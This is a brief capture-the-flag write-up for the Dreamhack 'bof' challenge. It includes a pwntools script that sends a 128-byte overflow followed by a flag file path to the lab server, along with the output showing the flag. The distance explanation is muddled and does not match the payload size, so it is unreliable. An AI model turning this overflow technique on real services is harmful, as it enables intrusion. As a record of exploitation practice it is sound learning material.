# Dreamhack : bof

[ Author : L1ya ]

**1. Analysis**  

This problem’s difficulty is knowing distance.  

The buf’s size is 0x90, but program starts, ebp~ebp-0x10 fills.  

So it’s real distance is 0x10  

**2. Vulnerabilities**  

This program’s vulnerability is Buffer-overflow  

**3. Exploitation**  

```python
from pwn import *  

p=remote("host8.dreamhack.games", 20565)  

payload = b"A" * 128  
payload += b'/home/bof/flag'  

p.sendline(payload)  
p.interactive()  
```

**4. Result**  

[+] Opening connection to host8.dreamhack.games on port 20565: Done  
[*] Switching to interactive mode  
meow?  
DH{flag}  

meow, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/home/bof/flag :)  
[*] Got EOF while reading in interactive  

 [ NOTE ]  

 I can know how to get real distance. I didn’t know it fills.  
